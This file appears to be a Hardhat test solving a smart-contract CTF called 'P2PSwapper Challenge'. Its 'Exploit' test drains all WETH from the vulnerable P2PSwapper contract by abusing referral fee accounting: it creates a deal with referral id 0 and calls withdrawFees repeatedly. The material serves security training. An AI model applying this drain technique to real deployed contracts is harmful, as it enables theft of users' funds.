const { expect } = require("chai");
const { ethers } = require("hardhat");
//const { web3 } = require("web3");

describe("P2PSwapper Challenge", function () {


  before(async function () {
    [deployer, attacker, temp1, temp2, temp3, temp4] = await ethers.getSigners();
    
    const WETHFactory = await ethers.getContractFactory("P2P_WETH", deployer);
    this.weth = await WETHFactory.deploy();

    const P2PSwapperFactory = await ethers.getContractFactory("P2PSwapper", deployer);
    this.p2p = await P2PSwapperFactory.deploy(this.weth.address);

    // createDeal
    let deposit_value = ethers.BigNumber.from(1).mul(10).pow(18).sub(313337);
    // console.log(deposit_value);
    await this.weth.connect(deployer).deposit({value: deposit_value});
    await this.weth.connect(deployer).approve(this.p2p.address, 1);
    await this.p2p.connect(deployer).createDeal(this.weth.address, 1, this.weth.address, 0xe8d4a51000, {value: 313337});

    // Check Env
    console.log("Start WETH Balance Of P2PSwapper :", await this.weth.balanceOf(this.p2p.address));   // 313338 (1 + 313337)
    // console.log(await this.weth.balanceOf(deployer.address));   // 999999999999686662 (1 * 10 ** 18 - 313337)
    // console.log(await web3.eth.getBalance(this.weth.address));  // 1 * 10 ** 18
    // console.log(await this.p2p.partnerFees(1));                 // 313337 / 2

    console.log(await this.p2p.connect(deployer).addressById(1));
    console.log(await this.p2p.connect(deployer).userByAddress(deployer.address));

  });

  it('Exploit', async function () {

    // Case 1. Referal [1] : drained only 156670
    // await this.p2p.connect(attacker).signup(1);
    // await this.p2p.connect(attacker).withdrawFees(attacker.address);
    
    // Case 2. Referal [0] : Drain ALL WETH
    await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther("1")});
    await this.weth.connect(attacker).approve(this.p2p.address, ethers.utils.parseEther("1"));

    await this.p2p.connect(attacker).createDeal(this.weth.address, 1, this.weth.address, 1, {value: 1200000});
    console.log(await this.p2p.partnerFees(0));   // bypassed attacker's
    console.log(await this.p2p.partnerFees(1));   // exists referral

    console.log(await this.weth.balanceOf(this.p2p.address));

    await this.p2p.connect(attacker).withdrawFees(temp1.address);
    await this.p2p.connect(attacker).withdrawFees(temp2.address);

    await this.weth.transfer(this.p2p.address, 286661);
    await this.p2p.connect(attacker).withdrawFees(attacker.address);

    console.log(await this.weth.balanceOf(this.p2p.address));

  });

  after(async function () {
    // SUCCESS CONDITIONS
    expect(
      await this.weth.balanceOf(this.p2p.address)
    ).to.be.equal(0)
  });
});